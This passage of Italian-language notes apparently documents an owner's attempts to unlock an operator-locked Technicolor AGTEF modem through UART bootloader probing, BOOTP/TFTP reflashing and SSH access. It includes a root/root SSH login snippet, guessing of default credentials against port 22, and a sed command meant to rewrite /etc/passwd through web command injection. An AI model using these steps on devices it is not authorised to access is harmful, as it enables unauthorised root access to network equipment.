  accettazione stretta; un singolo invio o una raffica di ~20 invii in
  6 secondi a volte non basta, ma ripetendo il tentativo (stesso script,
  stesso trigger) alla fine ha funzionato (`Entering BOOT-P mode (reason:
  BUTTON_PUSH)`), in modo ripetibile una volta capito il pattern.

**Risultato: BOOT-P mode raggiungibile via UART, ma non offre nulla di più
del meccanismo di recovery via rete già noto** (stesso flusso BOOTP/TFTP
descritto nel resto di questo documento). Provati anche altri tasti allo
stesso punto (Ctrl+C, Esc, spazio, `c`, Invio) — nessuno espone una
console/shell diversa o più ricca. Il bootloader sembra avere la vera
console interattiva (stile CFE/U-Boot con comandi) disabilitata in
produzione, pratica comune sui CPE bloccati dagli operatori. Senza risposta
BOOTP, il boot va in timeout da solo dopo un po' (`BOOTP Reply timeout /
Resetting the gateway`) e riparte normalmente — non serve power-cycle
manuale per uscirne.

**Non trovato**: un modo per editare la kernel command line (es. aggiungere
`init=/bin/sh` per un accesso diretto a una shell root bypassando
nginx/lua) — richiederebbe una vera console bootloader che qui non sembra
esposta. **Testato in modo esaustivo**: spam di 6 tasti diversi (`b`,
Ctrl+C, Esc, spazio, `c`, Invio) sia nella finestra stretta del prompt
"Press b" sia per l'intera durata del boot (dal primissimo byte dopo
power-on, ~20s, coprendo BootROM/DDR-training/tutto) — in ogni caso l'unica
reazione ottenuta è sempre e solo l'ingresso in BOOT-P mode (via tasto
`b`), mai una console diversa. Conclusione: **questo bootloader espone una
sola funzione interattiva via seriale**, il resto è verosimilmente
disabilitato in produzione. Via chiusa per questa strada specifica.

Script usati (in `F:\Modem\tftpd64\`, non nel repo — vedi cronologia se
servono da recuperare): `uart_capture.py` (sola cattura, con
riconnessione automatica), `uart_interrupt.py` (cattura + invio
automatico al trigger, con spam multi-tasto), `uart_send.py` (invio
manuale di una stringa), `uart_tx_test.py` (batteria di test TX: BREAK,
Ctrl+C, SysRq, testo libero).

### 10.2 Test con firmware AGTEF_2.2.0_CLOSED.rbi (stesso blocco, sintomo diverso)

Riflashato lo stesso modem (stessa identica procedura BOOTP/TFTP, cambiando
solo il file servito come `VBNT-K`) con `AGTEF_2.2.0_CLOSED.rbi` invece di
1.0.3, per capire se il problema fosse specifico della versione 1.0.3 o
strutturale sull'hardware.

**Risultato: bloccato in modo diverso, ma comunque bloccato.** Con 2.2.0
non si è mai vista la pagina Lua grezza (`ngx.print(...)`) vista con 1.0.3.
Invece, il webserver nginx risponde in modo "pulito" (header completi:
`X-Frame-Options`, `x-xss-protection`, `X-Content-Type-Options`, assenti
nelle risposte 1.0.3) ma con **503 Service Temporarily Unavailable
stabile e persistente** su tutte le pagine (`/`, `/login.lp`,
`/modals/gateway-modal.lp`), anche con tutti i LED del modem verdi
(sincronizzazione fisica/DSL completata). nginx stesso e' configurato
correttamente, ma il backend a cui fa da proxy (il servizio applicativo
lua/webui vero e proprio) non risulta mai su. A differenza di 1.0.3 non si
osservano piu' cicli di crash-restart una volta stabilizzato — resta
fermo su 503 in modo consistente.

**Scoperta importante, indipendente dal problema del webserver:** con
questo firmware **`root/root` e' una password SSH valida** (autenticazione
accettata da dropbear):

```powershell
$cred = New-Object System.Management.Automation.PSCredential("root", (ConvertTo-SecureString "root" -AsPlainText -Force))
New-SSHSession -ComputerName 192.168.1.1 -Credential $cred -AcceptKey -Force
# -> si connette con successo
```

Pero' **l'account root non ha una shell utilizzabile** — qualunque comando
eseguito restituisce `ExitStatus: 1`, nessun output, nessun errore, e
anche uno shell stream interattivo non produce nulla (probabile shell
impostata a `/bin/false` o equivalente, blocco intenzionale). Questo
significa che la password root e' gia' "sbloccata" di suo su questo
firmware — l'unica cosa che manca e' un modo per eseguire UN comando
(tipicamente `sed -i '1croot:x:0:0:root:/root:/bin/ash' /etc/passwd` per
riabilitare la shell) — ma l'unico vettore noto per farlo resta l'injection
via webUI, bloccata dallo stesso problema del backend 503.

### 10.3 Tentativi esplorati senza successo (per non ripeterli)

- **Password SSH statiche/di default** — ricerca incrociata su
  ilpuntotecnico.com, forum.fibra.click, vitadastudente.it,
  hack-technicolor: **nessuna fonte documenta una password SSH statica**
  per il firmware 1.0.3. L'unico modo documentato per ottenere SSH è lo
  stesso exploit web (diagnostica/injection) che stiamo già usando.
- **Tentativo diretto di combinazioni comuni** (`admin/admin`,
  `admin/Admin`, `admin/root`, `root/admin`, `root/Admin`, `admin/<vuoto>`)
  contro la porta 22 — tutte fallite. Quasi certamente solo l'utente
  `root` esiste a livello di sistema (`admin` è solo un concetto della
  webUI, non un utente Unix reale).
- **"AGTEF Unlocker"** (tool dedicato di Ansuel, stesso autore
  dell'ecosistema hack-technicolor, distinto da AutoFlashGUI generico) —
  link di download: `https://repository.ilpuntotecnico.com/index.php?dir=Ansuel/AGTEF/&file=AGTEF%20Unlocker.exe`.
  **Non scaricabile in modo automatico**: sia la richiesta diretta sia con
  header da browser (`User-Agent`/`Referer` falsificati) restituiscono una
  pagina HTML di protezione/anti-bot del forum (~52KB), non il vero
  eseguibile — probabilmente richiede una sessione autenticata sul forum o
  il superamento di una verifica JavaScript, non simulabile da riga di
  comando. Se qualcuno lo scarica a mano da browser, comunque **quasi
  certamente userebbe lo stesso vettore web** già bloccato dal problema
  del rendering Lua (§10), quindi non è stato considerato prioritario
  insistere su questa strada.

## Riepilogo pitfall (per chi ha fretta)

| Sintomo | Causa | Fix |
|---|---|---|
| AutoFlashGUI: `ChunkedEncodingError` sistematico | Checksum offload NIC | Disabilita IPv4/TCP/UDP checksum offload + LSO (§2.2) |
| Tftpd64 non logga mai le richieste BOOTP del modem | BOOTP legacy senza opzione DHCP 53 | Usa uno script dedicato (§3), non il DHCP server di Tftpd64 |
| Script Python riceve solo 1-2 pacchetti su 49 | Stesso problema di offload, stack socket standard | Passa a scapy/Npcap (§3.2), verifica comunque §2.2 |
| Nessun traffico arriva a un secondo processo sulla stessa porta | Due processi bindati sulla stessa porta (SO_REUSEADDR) | Un solo processo per porta; disattiva DHCP Server in Tftpd64 se usi uno script esterno |
| Regola firewall creata ma il programma non riceve comunque nulla | Regola legata al programma sbagliato (es. solo tftpd64.exe, non anche python.exe) | Una regola per ogni eseguibile coinvolto |
| Categoria rete torna "Public" da sola | Nuovo profilo di rete creato a ogni link flap/power-cycle | Riverificare/riapplicare dopo ogni power-cycle del modem |
| Wireshark segna la nostra risposta BOOTP "Malformed Packet" | Manca il magic cookie RFC1048 prima delle opzioni | Aggiungere `bytes([99,130,83,99])` prima delle opzioni (non bloccante per il client U-Boot, ma da correggere) |
| Pagine web del modem mostrano codice Lua grezzo invece di HTML | Probabile stato "non provisionato" (captive portal su :8080) per WAN/VDSL scollegato — vedi §10.1 | Non ancora risolto; richiede decisione consapevole (riconnettere VDSL = rischio re-lock operatore) |
| Portscan veloce (200 thread paralleli) trova solo 1 porta aperta invece di 6 | Stack TCP del device embedded saturato dalla concorrenza troppo alta | Riscansiona con meno thread (~20) e timeout più lungo (1.5s+) |
